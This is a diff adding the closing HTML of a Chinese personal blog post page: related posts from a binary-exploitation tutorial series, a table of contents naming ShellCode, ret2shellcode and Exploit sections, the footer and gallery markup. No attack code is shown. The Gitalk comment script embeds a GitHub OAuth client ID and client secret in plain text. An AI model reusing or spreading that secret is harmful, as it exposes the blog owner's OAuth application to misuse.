+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part2 --- 工具的使用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/cover.781de6edaf36962e5b0cc87723920ee2_hu576b02bd11baef12c82f0e62b58bf2a0_136072_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part1---基础知识"
+                        
+                        data-hash="md5-eB3m7a82li5bDMh3I5IO4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part1---基础知识</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: "350f7151191770b41225",
+        clientSecret: "ddbff992a105766dc2834098a20c8e1e497b27c1",
+        repo: "kira-pgr.github.io",
+        owner: "Kira-Pgr",
+        admin: ["Kira-Pgr"],
+        distractionFreeMode: false, 
+        id: md5(location.pathname), 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2023 猫猫の博客
+    </section>
+    
+    <section class="powerby">
+        
+            For a better open source community! <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#资料投放">资料投放</a></li>
+    <li><a href="#shellcode">ShellCode</a>
+      <ol>
+        <li><a href="#什么是shellcode">什么是ShellCode</a></li>
+        <li><a href="#如何获取shellcode">如何获取ShellCode</a>
+          <ol>
+            <li><a href="#利用pwntools自带函数">利用PWNTools自带函数</a></li>
+            <li><a href="#网上找现成的shellcode">网上找现成的ShellCode</a></li>
+            <li><a href="#metasploit">metasploit</a></li>
+            <li><a href="#自己写">自己写</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#pwn-pwn-pang">PWN! PWN! PANG?</a></li>
+    <li><a href="#ret2shellcode">ret2shellcode</a>
+      <ol>
+        <li><a href="#反汇编分析">反汇编分析</a></li>
+      </ol>
+    </li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#ref">Ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script src="/js/snow.js"></script>
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+    </body>
+</html>
